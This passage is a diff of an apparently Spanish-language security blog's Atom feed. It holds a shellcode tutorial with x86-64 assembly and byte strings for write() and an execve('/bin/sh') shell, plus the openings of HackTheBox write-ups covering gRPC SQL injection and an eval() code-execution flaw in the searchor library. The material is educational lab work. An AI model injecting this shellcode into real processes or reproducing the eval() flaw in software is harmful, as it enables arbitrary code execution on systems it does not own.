-mmap(0x7fde591c0000, 52848, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fde591c0000
-close(3)                                = 0
-mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fde58fe1000
-arch_prctl(ARCH_SET_FS, 0x7fde591ce640) = 0
-set_tid_address(0x7fde591ce910)         = 60068
-set_robust_list(0x7fde591ce920, 24)     = 0
-rseq(0x7fde591cef60, 0x20, 0, 0x53053053) = 0
-mprotect(0x7fde591ba000, 16384, PROT_READ) = 0
-mprotect(0x5555f2670000, 4096, PROT_READ) = 0
-mprotect(0x7fde59229000, 8192, PROT_READ) = 0
-prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
-munmap(0x7fde591cf000, 167079)          = 0
-newfstatat(1, &quot;&quot;, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
-getrandom(&quot;\x52\x39\x5a\x38\x9f\x83\x1b\x9e&quot;, 8, GRND_NONBLOCK) = 8
-brk(NULL)                               = 0x5555f3c59000
-brk(0x5555f3c7a000)                     = 0x5555f3c7a000
-write(1, &quot;ola\n&quot;, 4ola
-)                    = 4
-exit_group(4)                           = ?
-+++ exited with 4 +++
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Todas estas syscalls es lo que hace nuestro simple binario por detras, y nosotros no vemos este funcionamiento, solo vemos que imprime la cadena ola.&lt;/p&gt;
-
-&lt;p&gt;A lo que quiero llega es que cada instruccion que hacemos en los lenguajes de programacion, tiene una syscall asociada, ya sea C, Python, Rust, Golang, etc, y es importante conocer las syscalls, por que cuando se desarrollan shellcodes, se llaman directamente a las sycalls tomando en cuenta su estructura.&lt;/p&gt;
-
-&lt;p&gt;Para llamar a syscalls desde lenguaje ensamblador se toman en cuenta las calling conventions, asi que para llamar a uns syscall se hace de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall(rdi,rsi,rdx,r10,r8,r9)&lt;/code&gt;, recuerda que los primeros 6 argumentos se pasan por los registos rdi,rsi,rdx,r10,r8,r9, y lo demas se pasa por el stack&lt;/p&gt;
-
-&lt;h2 id=&quot;shellcode-usando-write&quot;&gt;Shellcode usando write()&lt;/h2&gt;
-
-&lt;p&gt;Esta syscall es usada para imprimir algo por la salida estandar (stdout), tiene la estructura:&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;int fd: Es el descriptor de archivos donde se va a escribir, se puede establecer como 1(stdout), 2(sdterr), o cualquier otro descriptor que se abrio&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;void *buf: Es un puntero al buffer desde donde se empezaran a leer los datos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;size_t count: Es el numero de bytes que se van a escribir&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ahora toca programiar en ensamblador:&lt;/p&gt;
-
-&lt;p&gt;Primeramente vamos a definir el inicio de nuestro programa, y lo hare de esta manera:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
-        global _start:
-
-_start:
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;section .text&lt;/code&gt; le estoy diciendo que las instrucciones que le siguen, o apartir de ese punto, se van a almacenar en la seccion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.text&lt;/code&gt;, y eso es asi, por que esa seccion contiene las instrucciones que se van a ejecutar.&lt;/p&gt;
-
-&lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;global _start&lt;/code&gt; le estoy diciendo que exporte los simbolos a partir de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt;, para que sean visiable desde fuera del archivo, y se hace con el fin de que puedan ser leidos por el enlazador (ld).&lt;/p&gt;
-
-&lt;p&gt;Y dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; va todo nuestro codigo, y el programa completo se veria asi:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
-        global _start:
-
-_start:
-        mov rax, 1
-        mov rsi, 0x616e757a614e
-        push rsi
-        mov rsi, rsp
-        mov rdx, 6
-        syscall  
-        mov rax, 60
-        syscall
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, 1&lt;/code&gt; estamos copiando el numero 1, al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, es 1, por que la syscall write esta asociada a ese numero en GNU/Linux&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, 0x616e757a614e&lt;/code&gt; le estamos diciendo que copie el valor que queremos mostrar (0x616e757a614e), al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y en este caso, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; va a funcionar como puntero al valor que se va a escribir&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rsi&lt;/code&gt; Esta poniendo el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; en el stack, con el fin de que la syscall pueda acceder a lo que queremos imprimir&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Aqui le indicamos que copie la direccion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, y ahora si, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt; apunta al valor que vamos a imprimir el cual esta en el stack&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdx, 6&lt;/code&gt; Le estamos indicando el tamaño en bytes de lo que se va a mostrar, asi que copia el tamaño de 6 bytes al registro rdx&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; se hace el llamado a write&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Las ultima dos instrucciones se hace el llamado a la syscall exit para que todo termine correctamente&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;Ojo&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Te podras dar cuenta que no se usa el registro rdi, que para write, es usado para el descriptor de archivos, y diras: “Como es posible eso, si en la estructura de write se debe de establecer el registro rdi en 1, de hecho y &lt;a href=&quot;https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit&quot;&gt;aca&lt;/a&gt; lo dice”. Y pues no necesariamente, por que el descriptor de archivos ya tiene establecido por defecto el valor 1 para stdout.&lt;/p&gt;
-
-&lt;p&gt;Ahora procedemos a compilar: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nasm -f elf64 shellcode.asm&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Esto nos dejara un archivo .o el cual debemos de enlazar: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld -m elf_x86_64 -s -o write shellcode.o&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Estos dos comandos nos dejo un binario elf, el cual si ejecutamos, se ejecutara la syscall write, y mostrara el texto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y a toda madre, funciona, pero eso no es una shellcode, es un binario elf, y si lo vemos en un editor hexadecimal podemos ver la shellcode en hexadecimal&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Asi que para pasarla a un byte array, que seria la forma en la que se inyectan, primero usaremos&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objcopy -j .text -O binary shellcode.o write.bin&lt;/code&gt; para generar un archivo .bin&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexdump -v -e '&quot;\\&quot; 1/1 &quot;x%02x&quot;' write.bin; echo&lt;/code&gt; para imprimir el byte array&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y ahora si, esto si es una shellcode a como estamos acostumbrados a verlas:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\xb8\x01\x00\x00\x00\x48\xbe\x4e\x61\x7a\x75\x6e\x61\x00\x00\x56\x48\x89\xe6\xba\x06\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;shellcode-para-conseguir-una-shell&quot;&gt;Shellcode para conseguir una shell&lt;/h2&gt;
-
-&lt;p&gt;Ahora usaremos execve para poder ejecutar /bin/sh, y que consigamos una shell, el codigo es el siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;section .text
-    global _start
-
-_start:
-
-    xor rdx, rdx
-    push rdx
-    mov rax, 0x68732f2f6e69622f
-    push rax
-    mov rdi, rsp
-    push rdx
-    push rdi
-    mov rsi, rsp
-    xor rax, rax
-    mov al, 0x3b
-    syscall
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Explicare directamente lo que esta dentro de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_start&lt;/code&gt; por que lo demas ya saben que hace&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rdx, rdx&lt;/code&gt; El registo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdx&lt;/code&gt; haciendo una operacion XORing consigo mismo, esto es para que el registro este limpio antes de usarlo, es buena practica nomas, si se le quita no pasa nada&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos un null bye al stack para indicar el final de la cadena que se le pasara como argumento a execve&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rax, 0x68732f2f6e69622f&lt;/code&gt; Copiamos /bin/sh al registro rax (la cadena esta en hex)&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rax&lt;/code&gt; Metemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; al stack para que pueda ser accedida por el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rdi, rsp&lt;/code&gt; Copiamos la direccion de /bin/sh en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdi&lt;/code&gt;, la cual sera el primer argumento de execve, en ese momento el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; apunta a la direccion de /bin/sh&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdx&lt;/code&gt; Metemos otro byte nulo al stack&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rdi&lt;/code&gt; Metemos la direccion de /bin/sh en el stack&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt; Copiamos la direccion del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsi&lt;/code&gt;, esto funcionara como segundo argumento de execve, que representa el entorno del programa que se ejecutara&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rax, rax&lt;/code&gt; Lo mismo que el primer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov al, 0x3b&lt;/code&gt; Copiamos el valor 0x3b que representa el numero de la syscall, al registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;al&lt;/code&gt; que funciona como un byte inferior de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;, y por ultimo se ejecuta la syscall&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Si volvemos a hacer todo el tramite de compilar y enlazar, ya tendremos nuestro ejetutable que nos da una shell, si vemos la shellcode en hex, todo esta perfecto:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y si ejecutamos, nos da una shell:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y listo, tenemos otra shellcode:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y como ultimo, estos dos codigos que te explique, no es la unica forma de llamar a write o execve, ya depende del creador y del contexto donde se usa, y supongo que te ha pasado que cuando haces un BoF, una shellcode te sirve y otra no, aun que tengas todo tu exploit bien.&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="MalDev" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/shellcode/waifu.gif" /><media:content medium="image" url="/assets/img/shellcode/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox PC - SQL injection in gRPC service</title><link href="/blog/posts/2023-05-23-htb-pc/" rel="alternate" type="text/html" title="HackTheBox PC - SQL injection in gRPC service" /><published>2023-05-23T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-pc</id><content type="html" xml:base="/blog/posts/2023-05-23-htb-pc/">&lt;p&gt;Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.&lt;/p&gt;
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="SSTI" /><summary type="html">(soy ese)</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/UPDWP-ssti/waifu.jpg" /><media:content medium="image" url="/assets/img/UPDWP-ssti/waifu.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox PC - SQL injection in gRPC service</title><link href="/blog/posts/2023-05-23-htb-pc/" rel="alternate" type="text/html" title="HackTheBox PC - SQL injection in gRPC service" /><published>2023-05-23T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-pc</id><content type="html" xml:base="/blog/posts/2023-05-23-htb-pc/">&lt;p&gt;Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.&lt;/p&gt;
 
 &lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
 
@@ -1910,276 +2063,4 @@ ROPE{a_placeholder_32byte_flag!}
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/HTB-entity/tc3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;</content><author><name>c4rta</name></author><category term="posts" /><category term="type confusion" /><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/img/HTB-entity/waifu.gif" /><media:content medium="image" url="/assets/img/HTB-entity/waifu.gif" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">HackTheBox Busqueda - Arbitrary Code Execution via eval()</title><link href="/blog/posts/2023-04-11-htb-busqueda/" rel="alternate" type="text/html" title="HackTheBox Busqueda - Arbitrary Code Execution via eval()" /><published>2023-04-11T00:00:00-06:00</published><updated>2023-05-31T19:37:58-06:00</updated><id>/blog/posts/htb-busqueda</id><content type="html" xml:base="/blog/posts/2023-04-11-htb-busqueda/">&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeracion&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con un escaneo con el comando&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sS -n -Pn --open -p- 10.129.58.76&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Donde le indicamos que con:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, esto con el fin de iniciar la conexion sin que termine&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;n: para que no haga resolucion DNS y tarde menos el escaneo&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Pn: para evitar el descubrimiento de hosts&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;open: para que solo muestre los puertos abiertos&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;-p-: para que escanee todo el rango de puertos&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Y nos reporto que hay varios puertos abiertos:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora escanearemos los puertos 22, 80 buscando la version y servicio y demas informacion:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
-|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
-80/tcp open  http    Apache httpd 2.4.52
-| http-server-header: 
-|   Apache/2.4.52 (Ubuntu)
-|_  Werkzeug/2.1.2 Python/3.10.6
-|_http-title: Searcher
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No nos reporta mucha informacion interesante y aun no tenemos credenciales para SSH.&lt;/p&gt;
-
-&lt;p&gt;Si interceptamos la peticion con burp, podemos ver que nuestro input esta pasando por el parametro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;query&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/busqueda/busqueda2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;vulnerabilidad-en-searchor&quot;&gt;Vulnerabilidad en searchor&lt;/h2&gt;
-
-&lt;p&gt;Si vemos en el footer de la pagina, podemos ver que esta usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchor&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/busqueda/busqueda3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si le damos click en el nombre, nos mandara a su repo de github, sin embargo la version que sale es la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.5.2&lt;/code&gt;, asi que empezaremos a buscar entre las versiones, a ver si encontramos algo interesante.&lt;/p&gt;
-
-&lt;p&gt;En la version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2.4.2&lt;/code&gt; se arreglo una vulnerabilidad en la busqueda por CLI:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/busqueda/busqueda4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al ver las notas del parche, basicamente nos dice que se removio el metodo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt; de la busqueda por CLI, ya que podiamos ejecutar codigo arbitrario:&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;query&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-            &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Engine.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.search('&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;', copy_url=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, open_web=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)&quot;&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;searchor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;history&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
